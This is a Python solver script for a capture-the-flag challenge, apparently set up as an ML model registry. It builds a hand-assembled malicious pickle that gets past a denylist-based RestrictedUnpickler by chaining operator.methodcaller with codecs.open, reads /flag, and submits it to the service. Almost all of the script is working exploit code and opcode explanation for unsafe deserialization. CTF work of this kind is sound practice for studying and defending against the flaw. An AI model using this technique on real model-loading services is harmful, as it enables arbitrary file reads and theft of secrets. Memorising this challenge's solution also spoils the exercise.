#!/usr/bin/env python3
"""Solver for ml-pickle-rce (ModelHub).

Strategy
--------
The registry loads our pickle through a RestrictedUnpickler whose find_class
rejects a GLOBAL opcode when its *module* is on a denylist (os, subprocess, sys,
builtins, importlib, and every one-shot file reader like linecache / gzip /
pathlib). So the textbook `(os.system, ("...",))` reduce is rejected, and so is
`(builtins.open, ...)` and `(linecache.getlines, ...)`.

But the denylist only inspects the classes *named by GLOBAL*. It does not
constrain:
  1. what an already-allowed callable does once invoked, or
  2. how many callables we chain together on the pickle VM stack.

Two modules survive the denylist and are all we need:
  * `codecs.open(path)`      -> returns an open file object   (module "codecs")
  * `operator.methodcaller`  -> build a callable `mc = methodcaller("read")`
                                 such that `mc(f) == f.read()` (module "operator")

Neither `codecs` nor `operator` is blocked. Neither returns file *content* in a
single call, which is exactly why the one-shot readers were the ones worth
blocking -- so we chain them by hand at the opcode level:

    mc = operator.methodcaller("read")     # REDUCE
    f  = codecs.open("/flag")              # REDUCE   (default mode "r")
    result = mc(f)                         # REDUCE  ==  f.read()  ==  the flag
    STOP

The loaded object is the flag string; the service returns repr(result), which
contains the flag.

Usage
-----
    python3 solve.py http://127.0.0.1:9080
    python3 solve.py http://127.0.0.1:9080 /flag      # override flag path
"""
import re
import sys
import json
import urllib.request

# Pickle opcodes we assemble by hand (protocol-agnostic; pickle.loads executes
# any mix). See CPython Lib/pickle.py.
GLOBAL = b"c"           # c<module>\n<name>\n  -> push find_class(module, name)
SHORT_BINUNICODE = b"\x8c"   # \x8c <1-byte len> <utf8>  -> push str
TUPLE1 = b"\x85"        # pop 1 -> push 1-tuple
REDUCE = b"R"           # pop (callable, argtuple) -> push callable(*argtuple)
STOP = b"."


def op_global(module: str, name: str) -> bytes:
    return GLOBAL + module.encode() + b"\n" + name.encode() + b"\n"


def op_ustr(s: str) -> bytes:
    b = s.encode("utf-8")
    assert len(b) < 256, "use a longer-length opcode for big strings"
    return SHORT_BINUNICODE + bytes([len(b)]) + b


def build_payload(flag_path: str = "/flag") -> bytes:
    p = b""
    # mc = operator.methodcaller("read")
    p += op_global("operator", "methodcaller")
    p += op_ustr("read")
    p += TUPLE1
    p += REDUCE
    # f = codecs.open(flag_path)          (default mode "r" -> text stream)
    p += op_global("codecs", "open")
    p += op_ustr(flag_path)
    p += TUPLE1
    p += REDUCE
    # result = mc(f) == f.read()
    p += TUPLE1          # wrap f as (f,)
    p += REDUCE          # mc(f)
    p += STOP
    return p


def submit(base_url: str, payload: bytes) -> dict:
    url = base_url.rstrip("/") + "/validate"
    req = urllib.request.Request(
        url, data=payload,
        headers={"Content-Type": "application/octet-stream"},
    )
    with urllib.request.urlopen(req, timeout=30) as resp:
        return json.loads(resp.read().decode())


def main() -> int:
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:9080"
    flag_path = sys.argv[2] if len(sys.argv) > 2 else "/flag"

    payload = build_payload(flag_path)
    result = submit(base_url, payload)
    print("service response:", json.dumps(result, indent=2))

    summary = result.get("model_summary", "")
    m = re.search(r"CTF\{[^}]*\}", summary)
    if m:
        print("\nFLAG:", m.group(0))
        return 0
    print("\nno flag in response; check the endpoint / flag path", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
